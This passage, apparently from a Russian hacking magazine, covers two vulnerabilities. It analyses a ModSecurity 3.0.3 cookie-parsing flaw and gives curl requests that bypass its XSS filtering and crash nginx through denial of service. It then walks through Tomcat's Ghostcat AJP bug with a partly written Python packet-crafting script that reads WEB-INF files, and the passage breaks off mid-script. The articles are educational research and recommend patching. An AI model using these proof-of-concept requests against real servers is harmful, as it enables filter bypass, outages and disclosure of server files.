wget https://raw.githubusercontent.com/SpiderLabs/owasp‐modsec
urity‐crs/v3.3/dev/rules/REQUEST‐901‐INITIALIZATION.conf
wget https://raw.githubusercontent.com/SpiderLabs/owasp‐modsec
urity‐crs/v3.3/dev/rules/REQUEST‐949‐BLOCKING‐EVALUATION.conf

Теперь нужно исполь зовать все эти пра вила в нашей конфигурации nginx.
Для этого я и создавал файл /usr/local/nginx/conf/modsec_includes.
conf.


include modsecurity.conf
include modsec/crs‐setup.conf
include modsec/rules/REQUEST‐901‐INITIALIZATION.conf
include modsec/rules/REQUEST‐941‐APPLICATION‐ATTACK‐XSS.conf
include modsec/rules/REQUEST‐949‐BLOCKING‐EVALUATION.conf

Обрати внимание на последовательность загрузки, она важна.
  На этом этап подготовки стенда закончен, осталось его проверить. Запус‐
тим веб‐сервер.


/usr/local/nginx/sbin/nginx ‐g "daemon off;master_process off;error_
log /dev/stdout debug;"

Я добавил несколь ко параметров, чтобы отклю чить запуск nginx как демона
и вывести логи в консоль. Если теперь отпра вить потенциально опасный зап‐
рос на сервер — http://nginxdos.vh/?xss=<script>alert()script>, то
ModSecurity заблокирует запрос и вернет 403.





  Готовый стенд. ModSecurity заблокировала потенциально опасный зап‐
  рос к серверу

Вот и готовый стенд. Переходим к препари рова нию уязвимости.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
       MODSECURITY ДОСИМ
                    КАК РАБОТАЕТ КРИТИЧЕСКИЙ БАГ
                           В ПОПУЛЯРНОМ WAF





ДЕТАЛИ
Начнем с того, что посмотрим на патч, который исправляет уяз вимость.
Изменения коснулись файла transaction.cc в разделе парсинга куков.
Запустим веб‐сервер через отладчик и пос тавим бряк на строку 558, чтобы
потрейсить процесс обработки.


gdb ‐‐arg /usr/local/nginx/sbin/nginx ‐g "daemon off;master_process
off;error_log /dev/stdout debug;"
b transaction.cc:558
r





  Отладка сервера nginx с библиотекой ModSecurity. Ставим брейк‐пойнт
  на парсере заголовка cookie

Отправляем зап рос с куками и попада ем в точку останова.


curl ‐v ‐H "Cookie: hello=world" nginxdos.vh





           Сработал брейк‐пой нт в про цес се парсинга куков

Как ты, скорее всего, зна ешь, в протоколе HTTP стро ка cookie представляет
собой последовательность пар имя=значение, разделенных символом ;.
Поэтому изначально вся строка раз бивается на час ти, где разделите лем слу‐
жит ;. Результат записывается в вектор (std::vector).


modsec/v3.0.3/src/transaction.cc
557: if (keyl == "cookie") {
558:     size_t localOffset = m_variableOffset;
559:     std::vector<std::string> cookies = utils::string::ssplit(
value, ';');

Вектор в C++ — это замена стандартному динамическому мас сиву, который
может управлять выделенной для него памятью. С его помощью можно соз‐
давать массивы, длина которых задается во время выполнения, без исполь‐
зования операторов new и delete. Все элементы вектора дол жны принад‐
лежать одному типу. В дополнение к функци ям прямого доступа элементы
вектора можно получить посредс твом итерато ров. Что и происходит дальше
по коду.


modsec/v3.0.3/src/transaction.cc
560: for (const std::string &c : cookies) {





            Перебираем все переданные в зап росе куки

Так как я передал одну куку, то и элемент всего один. Теперь он разбивается
по разделителю =. Таким образом получаем имя и значение cookie.


561: std::vector<std::string> s = utils::string::split(c,
562:    '=');

Дальше проверяется размер полученного вектора, и, если он больше еди‐
ницы, выполнение продолжается.


modsec/v3.0.3/src/transaction.cc
563: if (s.size() > 1) {





          Разбиваем содержимое cookie на пару имя‐значение

Пока все идет хорошо. Если обратиться к раз делу 5.2 спецификации RFC
6265 о механизмах хранения состояния в HTTP, то там под пунктом 2 увидим,
что если в паре имя‐значение отсутствует символ = (%x3D), то его нужно
игнорировать.





                Спецификация RFC 6265. Раздел 5.2

Именно так и происходит. А также частично выполняется и пункт 4 — удалять
все пробелы перед именем и пос ле него и значения куки. В нашем случае
только один про бел перед именем.


modsec/v3.0.3/src/transaction.cc
564: if (s[0].at(0) == ' ') {
565:     s[0].erase(0, 1);
566: }

А вот с третьим пунктом воз никли проблемы.





     Спецификация RFC 6265. О том, как парсить пару имя‐значение

Часть строки до пер вого появления сим вола = — это имя куки, а все, что пос‐
ле, — ее значение. То есть из хидера вида hello=cruel=world должна
получиться кука hello, зна чение которой cruel=world. Однако в случае
с ModSecurity 3.0.3 получим hello со значением cruel. Виной все му сле‐
дующий участок кода.


modsec/v3.0.3/src/transaction.c
567: m_variableRequestCookiesNames.set(s[0],
568:     s[0], localOffset);
569:
570: localOffset = localOffset + s[0].size() + 1;
571: m_variableRequestCookies.set(s[0], s[1], localOffset);

В качестве значения передается только вто рой элемент массива, а в данном
случае у нас получается их три: hello, cruel и world.





  Некорректный парсинг куки в ModSecurity 3.0.3 больше чем с одним сим‐
  волом =

Чем это может грозить? Если у тебя есть какие‐то пра вила, которые фильтру‐
ют разные виды атак в куках, например XSS или SQL‐инъ екции, то, используя
трюк с двойным символом =, мож но обходить эти фильтры.





                   Добавляем XSS в cookie

Для демонстрации я создам простень кий, уяз вимый к XSS скрипт.


index.php
<html>
    <body>
        <?php echo "Hello, ".($_COOKIE['user'] ? $_COOKIE['user'] :
'%username%'); ?>
    </body>
</html>

Если я напрямую передаю в куке XSS, то защита сра баты вает, если исполь‐
зую второй символ =, то XSS триггерится.


curl ‐H "Cookie: user=safe=<script>alert('xss')</script>" nginxdos.
vh/index.php





              Обход защиты от XSS в ModSecurity

Разумеется, нельзя отфиль тро вать то, что не удалось правильно прочитать.
  Обход фильтров WAF — это, конечно, интересно, но давай посмотрим, что
еще можно сделать. Вернемся к пункту 5 спецификации RFC 6265.





      Спецификация RFC 6265. Игнорируем cookie с пустым именем

То есть если имя куки пустое, то она должна игнорироваться. В ModSecurity
3.0.3 такой логики не предусмотрено. В свя зи с этим предлагаю еще раз вни‐
мательно посмотреть на следующий участок кода.


modsec/v3.0.3/src/transaction.cc
564: if (s[0].at(0) == ' ') {
565:     s[0].erase(0, 1);
566: }

Здесь проверяется, какой символ сто ит на нулевой позиции в имени куки.
А что произойдет, если передать cookie с пустым наз ванием?


curl ‐H "Cookie: =notsafe" nginxdos.vh/index.php

Программа попытается считать значение из пустого диапазона, что вызовет
исключение вида out_of_range.





  Ошибка при обработке пус того имени cookie при водит к завершению
  работы ModSecurity

Теперь программа завершит свою работу, а вместе с ней остановится и вор‐
кер nginx. Таким образом, постоянно отправляя запросы с вре доносной
кукой, можно вызвать отказ в обслуживании веб‐сервера, и он перестанет
обрабатывать запросы легитимных пользователей. Для этого можно восполь‐
зоваться простейшим PoC.


curl ‐s ‐H "Cookie: =notsafe" "nginxdos.vh/index.php?[0‐99999]"





  Отказ в обслуживании веб‐сервера nginx из‐за уяз вимос ти в библиотеке
  ModSecurity


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Рассмотренная уязвимость хорошо иллюстрирует, насколько опасно отхо‐
дить от спецификаций. Даже, казалось бы, мел кое упущение может в резуль‐
тате повлиять на стабильную работу всего при ложения и на безопасность
конечных пользователей.
  После того как разработчики были уведомлены об уязвимости, исследова‐
тель Эрвин Хегедюш тоже отпра вил два  pull‐реквеста с изменениями,
которые позволяют закрыть брешь (2023, 2201). В результате разработчики
пересмотре ли всю логику парсинга cookie и приб лизили ее к спецификации
RFC 6265.
  И конечно, если ты используешь ModSecurity версий от 3.0.0 до 3.0.3, то
поспеши обновиться до версии 3.0.4, где этот баг исправлен.
ВЗЛОМ
     КОТ
              ПРИЗРАК





                                                                                       aLLy
                                                                                   ONsec
                                                                                                @iamsecurity





КАК ЭКСПЛУАТИРОВАТЬ
НОВУЮ RCE‐УЯЗВИМОСТЬ
В ВЕБ‐СЕРВЕРЕ APACHE TOMCAT




Сегодня я рас смотрю уязвимость в Apache Tomcat, которая
позволяет читать файлы на сервере и при определенных
условиях выполнять произвольный код. Проблема скрывает‐
ся в особенностях реализации про токо ла AJP, по которому
происходит взаимо действие с сервером Tomcat. Для эксплу‐
атации  злоумышленнику  не  требуется  каких‐либо  прав
в целевой сис теме.


Tomcat — это кон тейнер сервлетов с открытым исходным кодом. Он написан
на языке Java и реализует такие спецификации, как JavaServer Pages (JSP)
и JavaServer Faces (JSF). Это один из наиболее популярных веб‐серверов,
особенно  часто он  используется  в  корпоративной среде.  Его  ставят
как самостоятельное решение или в качестве контейнера сервлетов в раз‐
личных серверах приложений, например GlassFish или JBoss.
   Баг нашел исследова тель из Chaitin Tech в начале этого года. Уязвимость
получила статус критической. Как сейчас стало модно, она обзавелась собс‐
твенным названием — Ghostcat — и логоти пом в виде кота‐призрака.
   Уязвимость  позволяет  зло умышленни ку  читать произвольные файлы
на целевой системе внутри директории appBase. Реализация протокола AJP
(Apache JServ Protocol) позволяет контролиро вать атрибуты, которые отве‐
чают за формирование пути до запрашива емых фай лов. Спе циально сфор‐
мированный запрос на сервер поз воляет про читать содержимое файлов,
доступ к которым невозможен в дру гих условиях. Если можно загрузить файл
на сервер, существует риск использования уяз вимос ти для выполнения про‐
извольного кода.


             INFO

                       Уязвимости присвоен идентификатор CVE‐2020‐
                      1938. Ошибка присутствует в актуальных вет ках
                      дистрибутива и затрагивает все версии Apache
                       Tomcat ниже 9.0.31, 8.5.51 и 7.0.100.



ТЕСТОВЫЙ СТЕНД
Начнем со стенда для тестирова ния уязвимос ти. Для этого достаточно запус‐
тить контейнер Docker из официального репозитория Tomcat.


docker run ‐it ‐‐rm ‐p 8080:8080 ‐p 8009:8009 tomcat:9.0.30

Очень важно расшарить порт 8009, это AJP‐протокол, в котором и была най‐
дена уязвимость.
   Если хочется вместе со мной возиться с отладкой приложе ния, то нужно
действовать немного по‐дру гому. Для дебага я буду использовать  IntelliJ
IDEA. Сначала скачаем уязвимую версию Apache Tomcat. Я взял 9.0.30. Рас‐
пакуем и откроем проект в IDEA. Теперь создадим новую конфигурацию
отладки с шаблоном Remote.





                 Создание шаблона Remote в IDEA

Здесь в поле Command line arguments строка с параметрами, которые нуж‐
но указать при запуске сервера. Рекомендую выб рать версию JDK 1.4.x.





  Конфигурация отладки. Аргу менты для запус ка Tomcat в режиме удален‐
  ной отладки

Сами параметры можно передать в Docker с помощью ключа ‐e или ‐‐env.
Переменная  окружения,  используемая  для  этих  целей,  называется
JAVA_OPTS. Обрати внимание на опцию suspend: если она включена (sus‐
pend=y), Java будет приостанавливать загрузку вир туальной машины и ждать
подклю чения отладчика и только пос ле успешного коннекта продол жит
запуск. У меня получилась такая строка.


‐Xdebug ‐Xrunjdwp:transport=dt_socket,server=y,suspend=y,address=*:
5005

Запускаем контейнер. Не забывай проб расывать  порт, который  указал
для удаленной отладки.


docker run ‐it ‐‐rm ‐p 8080:8080 ‐p 8009:8009 ‐p 5005:5005 ‐‐name=
tomcatrce ‐‐hostname=tomcatrce ‐e "JAVA_OPTS=‐Xdebug ‐Xrunjdwp:transp
ort=dt_socket,server=y,suspend=y,address=*:5005" tomcat:9.0.30





                 Запущенный сервер Tomcat 9.0.30

Открываем браузер, перехо дим на запущенный сервер (не забывай, что
порт — 8080) и наблюда ем стра ницу 404. Дело в том, что в последних вер‐
сиях официального докер‐контейнера Tomcat пап ка webapps со стандартны‐
ми приложениями была переименована в webapps.dist. Дос таточно удалить
папку и создать симлинк на оригинальную версию директории.


docker exec tomcatrce rm ‐rf /usr/local/tomcat/webapps
docker exec tomcatrce ln ‐s /usr/local/tomcat/webapps.dist /usr/
local/tomcat/webapps

После этого обновляем страницу и видим при ветс твие сервера Tomcat.





              Приветственная стра ница стенда Tomcat

Tomcat работает, теперь дело за фронтендом, который поможет нам в иссле‐
довании AJP. Я создам еще один контейнер на основе Debian.


docker run ‐it ‐‐rm ‐p 80:80 ‐‐name=apache ‐‐hostname=apache ‐‐link=
tomcatrce debian /bin/bash

Понятно из названия, какой веб‐сервер я буду исполь зовать в качестве фрон‐
та, — Apache. Устанавлива ем.


apt update && apt install ‐y nano apache2

Я выбрал его, так как он проще в нас тройке прокси до Tomcat. Ты можешь
использовать любой дру гой веб‐сервер по желанию.
  Вклю чаем модуль для работы прокси с протоколом AJP.


a2enmod proxy_ajp

Теперь  редактируем  стандартный  конфиг  виртуального  хоста   (/etc/
apache2/sites‐enabled/000‐default.conf) и указываем адрес Tomcat.


ProxyPass / ajp://tomcatrce:8009/

И перезагружаем Apache.


service apache2 restart





       Проксируем тра фик через Apache к Tomcat по протоколу AJP

Помимо веб‐сер вера, нам также понадобится какой‐нибудь сниффер. Я буду
использовать Wireshark. На этом стенд готов. Кстати, если ты не любишь
Docker, то есть вариант ска чать с сайта разработ чика версию с готовыми
бинарниками. Все версии можно найти в раз деле с архивами.
   Теперь можно переходить к разбору уяз вимости.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
        КОТ- ПРИЗРАК
                 КАК ЭКСПЛУАТИРОВАТЬ НОВУЮ RCE‐
                                УЯЗВИМОСТЬ
                  В ВЕБ‐СЕРВЕРЕ APACHE TOMCAT





ДЕТАЛИ УЯЗВИМОСТИ. ЧТЕНИЕ ПРОИЗВОЛЬНЫХ ФАЙЛОВ
НА СЕРВЕРЕ
Apache JServ Protocol (AJP) — это бинарный протокол, созданный ради
избавления от избыточности HTTP. AJP гораздо более эффективен, обладает
высокой  произво дительностью  благодаря  значительной  оптимизации
и отлично масштабируется.
   AJP обычно исполь зуется для балансировки наг рузки, когда один или нес‐
колько внешних веб‐серверов (front‐end) отправляют запросы на сервер (или
серверы) приложений. Сессии нап равляются к нужному благодаря механиз‐
мам роута, где каждый сервер приложений получает свое имя.
  В современных Tomcat используется AJP 1.3 (AJP13). Пос кольку это дво‐
ичный протокол, браузер напрямую не может отправлять запросы AJP13.
Поэтому в качестве фронтенда выступа ет любой популярный веб‐сервер —
nginx, Apache, IIS.





  Вариант взаимодействия с сервером Tomcat через связку веб‐сервер —
  AJP


        WWW

                     Подробнее о протоколе ты можешь прочитать
                        в официальной документации.


По дефолту Tomcat принимает запросы AJP на порте 8009.


/tomcat9.0.30/conf/server.xml
<!‐‐ Define an AJP 1.3 Connector on port 8009 ‐‐>
<Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />

Видим, что дирек тива address отсутс твует, поэто му AJP доступен на всех
IPv4‐адресах локальной машины.





       По дефол ту Tomcat слушает AJP‐порт на всех адресах IPv4

Такая настройка крайне небезопас на, и сейчас ты поймешь почему.
  Для начала нам нужно разобраться в формате пакетов AJP. Запустим Wire‐
shark и сгенерируем любой легитимный запрос к серверу по AJP. В этом
как раз поможет фронтенд в виде веб‐сервера Apache.





  Снифаем трафик от Apache к Tomcat по про токолу AJP13 через Wireshark

Первые два байта в пакете — это Magic, который меняется в зависимости
от направления отправки. Пакеты, отправленные от веб‐сервера к контей‐
неру Tomcat, начинаются с 0x1234, а от контей нера к веб‐серверу — 0x4142
(строка AB, если переводить в ASCII). В рамках уязвимости нас инте ресует
только структура пакета, отправленно го от клиента к контейнеру, то есть
0x1234.
  Следующие два байта — это раз мер тела пакета. Это обычное числовое
значение типа integer. Далее идет байт, который в большинстве случаев ука‐
зывает на тип сооб щения. С него начинается подсчет длины тела пакета.
  Существуют сле дующие типы сооб щений от веб‐сервера к Tomcat.





                  Типы пакетов к контейнеру Tomcat

Сразу привлекает внимание пакет с кодом 0x7 (Shutdown), который выключа‐
ет сервер. Спе шу тебя разочаровать — пакет такого плана обработается
только в том случае, если он отправлен с хоста, на котором запущен Tomcat.
  Нас инте ресует код 0х2. С таким кодом отправляются, например, обычные
сообщения типа GET/POST. Формат тела такого сообщения выглядит сле‐
дующим образом.


AJP13_FORWARD_REQUEST :=
    prefix_code      (byte) 0x02 = JK_AJP13_FORWARD_REQUEST
    method           (byte)
    protocol         (string)
    req_uri          (string)
    remote_addr      (string)
    remote_host      (string)
    server_name      (string)
    server_port      (integer)
    is_ssl           (boolean)
    num_headers      (integer)
    request_headers *(req_header_name req_header_value)
    attributes      *(attribut_name attribute_value)
    request_terminator (byte) OxFF

За  кодом  идет  метод. Список  соот ношения  базовых  методов  с  их
байт‐кодами выглядит таким обра зом.


OPTIONS => 1
GET     => 2
HEAD    => 3
POST    => 4
PUT     => 5
DELETE  => 6
TRACE   => 7


/tomcat9.0.30/java/org/apache/coyote/ajp/Constants.java
// Translates integer codes to names of HTTP methods
private static final String [] methodTransArray = {
    "OPTIONS",
    "GET",
    "HEAD",
    "POST",
    "PUT",
    "DELETE",
    "TRACE",
    ...

В нашем пакете используется метод GET, поэтому и значение байта — 0x2.





              В пакете AJP используется метод GET

Далее все содержимое пакета доволь но привычно и похоже на обычный
HTTP‐запрос. После параметра is_ssl начина ется блок заголовков запроса
(request_headers). Следующие два байта (num_headers) отвечают за общее
количество заголовков в зап росе. Следом за ним перечисляются сами
хидеры. Каждый заголовок имеет следующий формат:


0xA0 + <тип_хидера>[1 байт] + <длина_хидера>[2 байта] + <
значение_хидера>[строка_размера_длины_хидера] + <конец_хидера>[байт
0x00]

Коды для стандартных заголовков определены в коде.





          Коды стандартных HTTP‐заголовков в протоколе AJP


/tomcat9.0.30/java/org/apache/coyote/ajp/Constants.java
// id's for common request headers
public static final int SC_REQ_ACCEPT          = 1;
public static final int SC_REQ_ACCEPT_CHARSET  = 2;
public static final int SC_REQ_ACCEPT_ENCODING = 3;
public static final int SC_REQ_ACCEPT_LANGUAGE = 4;
public static final int SC_REQ_AUTHORIZATION   = 5;
public static final int SC_REQ_CONNECTION      = 6;
public static final int SC_REQ_CONTENT_TYPE    = 7;
public static final int SC_REQ_CONTENT_LENGTH  = 8;
public static final int SC_REQ_COOKIE          = 9;
public static final int SC_REQ_COOKIE2         = 10;
public static final int SC_REQ_HOST            = 11;
public static final int SC_REQ_PRAGMA          = 12;
public static final int SC_REQ_REFERER         = 13;
public static final int SC_REQ_USER_AGENT      = 14;

Некоторые заголовки крайне важны, нап ример если content‐length (0x‐
A008) ненулевой, то Tomcat будет предполагать, что запрос имеет тело (как,
например, POST‐запрос), и попытается прочитать отдельный пакет.
  За  блоком  хидеров  следует  блок  атри бутов.  Его  использование
опционально, но это самая важная часть для понимания уязвимости.
  Существует несколь ко типов основных атрибутов, каждый из них имеет
код, а структура идентична структуре хидеров.


<тип_атрибута>[1 байта] + <длина_атрибута>[2 байта] + <
значение_атрибута>[строка_размера_длины_атрибута] + <конец_атрибута>[
байт 0x00]


/tomcat9.0.30/java/org/apache/coyote/ajp/Constants.java
// Integer codes for common (optional) request attribute names
public static final byte SC_A_CONTEXT       = 1;  // XXX Unused
public static final byte SC_A_SERVLET_PATH  = 2;  // XXX Unused
public static final byte SC_A_REMOTE_USER   = 3;
public static final byte SC_A_AUTH_TYPE     = 4;
public static final byte SC_A_QUERY_STRING  = 5;
public static final byte SC_A_JVM_ROUTE     = 6;
public static final byte SC_A_SSL_CERT      = 7;
public static final byte SC_A_SSL_CIPHER    = 8;
public static final byte SC_A_SSL_SESSION   = 9;
public static final byte SC_A_SSL_KEY_SIZE  = 11;
public static final byte SC_A_SECRET        = 12;
public static final byte SC_A_STORED_METHOD = 13;

Однако любое количество дру гих атрибутов может быть передано и через тип
req_attribute (0x0A). Пара имя:значение атрибута передается сразу же
после указания этого кода. В этом случае структура примет сле дующий вид:


0x0a[тип req_attribute] + <длина_имени_атрибута>[2 байта] + <
имя_атрибута>[строка_размера_длины_имени_атрибута] + <
конец_имени_атрибута>[байт 0x00] + <длина_значения_атрибута>[2
байта] + <значение_атрибута>[строка_размера_длины_значения_атрибута]
+ <конец_значения_атрибута>[байт 0x00]

Например, так передаются переменные окружения. После перечисления
необходимых атрибутов отправляется байт‐терминатор (0xFF), который озна‐
чает не только конец списка атрибутов, но и окончание всего пакета. Именно
до него считается длина тела пакета.
  Вернемся в Wireshark. Сейчас в моем запросе отправляются два атрибута.





  Дополнительные атрибуты, переда ваемые при помощи req_attribute
  в пакете AJP


AJP_REMOTE_PORT: 60588
AJP_LOCAL_ADDR: 127.0.0.1

В коде за обработку APJ‐запросов отвечает класс AjpProcessor.


/tomcat9.0.30/java/org/apache/coyote/ajp/AjpProcessor.java
/**
 * AJP Processor implementation.
 */
public class AjpProcessor extends AbstractProcessor {

Поставим брейк‐пой нт в отладчике на учас ток кода, где происходит обработ‐
ка дополнительных атри бутов, — метод prepareRequest.


/tomcat9.0.30/java/org/apache/coyote/ajp/AjpProcessor.java
private void prepareRequest() {
    ...
    // Decode extra attributes
    String requiredSecret = protocol.getRequiredSecret();
    boolean secret = false;
    byte attributeCode;
    while ((attributeCode = requestHeaderMessage.getByte()) != Consta
nts.SC_A_ARE_DONE) {
        switch (attributeCode) {
        case Constants.SC_A_REQ_ATTRIBUTE :
            requestHeaderMessage.getBytes(tmpMB);
            String n = tmpMB.toString();
            requestHeaderMessage.getBytes(tmpMB);
            String v = tmpMB.toString();

Повторно отправим запрос в браузере и перей дем в дебаггер.





     Отладка метода prepareRequest. Получаем атрибуты из запроса

В переменные n и v попадают имя и значение атрибута соответс твенно.
А дальше происходит нечто интерес ное.


/tomcat9.0.30/java/org/apache/coyote/ajp/AjpProcessor.java
if(n.equals(Constants.SC_A_REQ_LOCAL_ADDR)) {
    request.localAddr().setString(v);
} else if(n.equals(Constants.SC_A_REQ_REMOTE_PORT)) {
    try {
        request.setRemotePort(Integer.parseInt(v));
    } catch (NumberFormatException nfe) {
        // Ignore invalid value
    }
} else if(n.equals(Constants.SC_A_SSL_PROTOCOL)) {
    request.setAttribute(SSLSupport.PROTOCOL_VERSION_KEY, v);
} else {
    request.setAttribute(n, v );
}
break;

Если имя атрибута не входит в число обра баты ваемых, то управление
передается на строку 732, где вызывается метод setAttribute.


/tomcat9.0.30/java/org/apache/coyote/ajp/AjpProcessor.java
request.setAttribute(n, v );


/tomcat9.0.30/java/org/apache/coyote/Request.java
public void setAttribute( String name, Object o ) {
    attributes.put( name, o );
}

Но в моем случае атрибут AJP_REMOTE_PORT входит в список тех, на которые
есть отдельные ветки условия (константа SC_A_REQ_LOCAL_ADDR).


/tomcat9.0.30/java/org/apache/coyote/ajp/Constants.java
/**
 * AJP private request attributes
 */
public static final String SC_A_REQ_LOCAL_ADDR  = "AJP_LOCAL_ADDR";
public static final String SC_A_REQ_REMOTE_PORT = "AJP_REMOTE_PORT";
public static final String SC_A_SSL_PROTOCOL    = "AJP_SSL_PROTOCOL";

Что это за атрибуты и почему они так важны?
   Когда через AJP делаем запрос к статичному контенту (картинки, стили,
HTML‐страницы и  так  далее),  то Tomcat обрабатывает  такие запросы
при помощи DefaultServlet.


/tomcat9.0.30/conf/web.xml
<servlet>
    <servlet‐name>default</servlet‐name>
    <servlet‐class>org.apache.catalina.servlets.DefaultServlet</
servlet‐class>
    ...
<servlet‐mapping>
    <servlet‐name>default</servlet‐name>
    <url‐pattern>/</url‐pattern>


/tomcat9.0.30/java/org/apache/catalina/servlets/DefaultServlet.java
public class DefaultServlet extends HttpServlet {

При получении содержимого файла вызыва ется метод serveResource. Давай
поставим на него брейк‐пойнт и сделаем GET‐запрос к какой‐нибудь статике,
например к логотипу Tomcat — http://apache.vh/tomcat.png.


/tomcat9.0.30/java/org/apache/catalina/servlets/DefaultServlet.java
protected void doGet(HttpServletRequest request,
                     HttpServletResponse response)
    throws IOException, ServletException {
    // Serve the requested resource, including the data content
    serveResource(request, response, true, fileEncoding);
}


/tomcat9.0.30/java/org/apache/catalina/servlets/DefaultServlet.java
protected void serveResource(HttpServletRequest request,
                             HttpServletResponse response,
                             boolean content,
                             String inputEncoding)
    throws IOException, ServletException {
    boolean serveContent = content;
    // Identify the requested resource path
    String path = getRelativePath(request, true);

Сначала происхо дит вызов getRelativePath. Это метод для получения отно‐
сительного пути до файла.


/tomcat9.0.30/java/org/apache/catalina/servlets/DefaultServlet.java
protected String getRelativePath(HttpServletRequest request, boolean
allowEmptyPath) {
    ...
    String servletPath;
    String pathInfo;
    if (request.getAttribute(RequestDispatcher.INCLUDE_REQUEST_URI)
!= null) {
        ...
    } else {
        pathInfo = request.getPathInfo();
        servletPath = request.getServletPath();
    }

В  процессе  получаются  две  переменные  pathInfo  и  servletPath.
При помощи обычных запросов управлять первой мы не можем.





           Пустая переменная pathInfo при обычных запросах

Переменная servletPath — это путь до запрашива емого файла в контексте
текущего сервле та. Я пытаюсь открыть файл из корня — URI: /tomcat.png.
По умолчанию его будет обра батывать сервлет ROOT.





   Путь до ROOT и отно сительный путь до загружаемого файла tomcat.png

Надеюсь, ты уже заметил интерес ное условие (строка 434), которое передает
управление на рассмотренную выше логику. Как видишь, здесь присутствуют
атрибуты. В этом условии выполняется проверка javax.servlet.include.
request_uri.


/tomcat9.0.30/java/org/apache/catalina/servlets/DefaultServlet.java
protected String getRelativePath(HttpServletRequest request, boolean
allowEmptyPath) {
    ...
    if (request.getAttribute(RequestDispatcher.INCLUDE_REQUEST_URI)
!= null) {
        // For includes, get the info from the attributes
        pathInfo = (String) request.getAttribute(RequestDispatcher.
INCLUDE_PATH_INFO);
        servletPath = (String) request.getAttribute(RequestDispatcher
.INCLUDE_SERVLET_PATH);
    } else {


/tomcat9.0.30/java/javax/servlet/RequestDispatcher.java
static final String INCLUDE_REQUEST_URI = "javax.servlet.include.
request_uri";

Если он не пустой, то путь до файла, который нужно прочитать, формируется
напрямую из атрибутов. В этом участву ют javax.servlet.include.path_in‐
fo и javax.servlet.include.servlet_path.


/tomcat9.0.30/java/javax/servlet/RequestDispatcher.java
static final String INCLUDE_PATH_INFO = "javax.servlet.include.path_i
nfo";
...
static final String INCLUDE_SERVLET_PATH = "javax.servlet.include.
servlet_path";

В текущем запросе атрибуты отсутс твуют.





     Пустая переменная с атрибута ми в запросе AJP через веб‐сервер

Нужно это исправить и проверить, как формиру ется путь в этом случае.
Для этого нужно сгенерировать зарос AJP, в котором будут присутствовать
указанные атрибуты. Я воспользуюсь Python 3 для формирования пакета.
Рекомендую использовать именно третью версию, так как там проще обра‐
щаться с бинарными данными.
  Для начала подключим модуль struct, без него никуда.


ajp-packet.py
import struct

Затем нужно сделать функцию, которая будет преобразовы вать строки
в формат протокола AJP. Это здо рово сэконо мит время.


<длина_строки>[2 байта] + <строка> + <конец_строки>[байт 0x00]


ajp-packet.py
def pack_string(s):
    if s is None:
        return struct.pack(">h", ‐1)
    l = len(s)
    return struct.pack(">H%dsb" % l, l, s.encode('utf8'), 0)

Теперь просто идем по  структуре запроса. Сначала константа Magic
для пакетов, передаваемых от клиента к серверу Apache.


ajp-packet.py
magic = 0x1234

Далее идет длина. С ней мы раз берем ся в самом конце, сначала же нужно
сформировать сам запрос. Поэто му просто идем по структуре AJP13_FOR‐
WARD_REQUEST.


AJP13_FORWARD_REQUEST :=
    prefix_code      (byte) 0x02 = JK_AJP13_FORWARD_REQUEST
    method           (byte)
    protocol         (string)


ajp-packet.py
prefix_code = struct.pack("b", 2) # forward request
method = struct.pack("b", 2) # GET
protocol = pack_string("HTTP/1.1")

Теперь указываем URI запроса. С его помощью можно опре делить сервлет,
в контексте которого будет выполняться поиск файла. Проще говоря, если ты
хочешь прочитать файлы из директории examples, то здесь нужно указать /
examples/filename. Важна только директория, ведь наша задача — сфор‐
мировать путь до читаемого файла при помощи атрибутов. Сейчас я пробую
читать файл из ROOT, поэто му ука зываю /anything.


ajp-packet.py
req_uri = pack_string("/anything")

Продолжаем формирова ние запроса.


AJP13_FORWARD_REQUEST :=
    ...
    remote_addr      (string)
    remote_host      (string)
    server_name      (string)
    server_port      (integer)
    is_ssl           (boolean)
    num_headers      (integer)
    request_headers *(req_header_name req_header_value)
    attributes      *(attribut_name attribute_value)
    request_terminator (byte) OxFF


ajp-packet.py
remote_addr = pack_string("127.0.0.1")
remote_host = pack_string(None)
server_name = pack_string("tomcatrce")
server_port = struct.pack(">h", 80)
is_ssl = struct.pack("?", False)

После флага ssl идет блок заголовков. Нам они не нужны — указываем
количество хидеров, равное нулю. Не забываем, что в пакете размер чисел —
два байта.


ajp-packet.py
num_headers = struct.pack(">h", 0)

Пришло  вре мя  блока  атрибутов.  Атрибут  javax.servlet.include.re‐
quest_uri можно оставить пустым. Главное, чтобы он прос то был в пакете,
для прохождения проверки в усло вии. Два других взаимозаменяемы, и на их
основе формируется путь до файла на сервере. Воспользуемся атрибутом
javax.servlet.include.path_info, а javax.servlet.include.servlet_‐
path оставим пустым.
   Теперь нужно определить, какой файл сто ит попробовать прочитать.
Давай замахнемся на /ROOT/WEB‐INF/web.xml. В обычных условиях он
не читается, так как при парсинге запроса выпол няется проверка пути.


/tomcat9.0.30/java/org/apache/catalina/core/StandardContextValve.-
java
final class StandardContextValve extends ValveBase {
    ...
    public final void invoke(Request request, Response response)
        ...
        // Disallow any direct access to resources under WEB‐INF or
META‐INF
        MessageBytes requestPathMB = request.getRequestPathMB();
        if ((requestPathMB.startsWithIgnoreCase("/META‐INF/", 0))
                || (requestPathMB.equalsIgnoreCase("/META‐INF"))
                || (requestPathMB.startsWithIgnoreCase("/WEB‐INF/", 0
))
                || (requestPathMB.equalsIgnoreCase("/WEB‐INF"))) {
            response.sendError(HttpServletResponse.SC_NOT_FOUND);
            return;
        }





         Запрет прямого доступа к директории WEB‐INF в Tomcat

Разумеется, это происхо дит до получения содержимого запрашиваемого
файла и в проверке участвует только request_uri. Поэтому если мы укажем
этот путь в атрибуте javax.servlet.include.path_info, то дол жны будем
обойти проверку и прочитать файл.


AJP13_FORWARD_REQUEST :=
    ...
    attributes      *(attribut_name attribute_value)
    request_terminator (byte) OxFF


ajp-packet.py
attributes = {
            'javax.servlet.include.request_uri': '',
            'javax.servlet.include.path_info': '/WEB‐INF/web.xml',
            'javax.servlet.include.servlet_path': '',
            }
end = struct.pack("B", 0xff)

Теперь собираем все переменные в одну data. Это будет тело запроса.


ajp-packet.py
data = prefix_code
data += method
data += protocol
data += req_uri
data += remote_addr
data += remote_host
data += server_name
data += server_port
data += is_ssl
data += num_headers

Не забываем про атрибуты.


ajp-packet.py
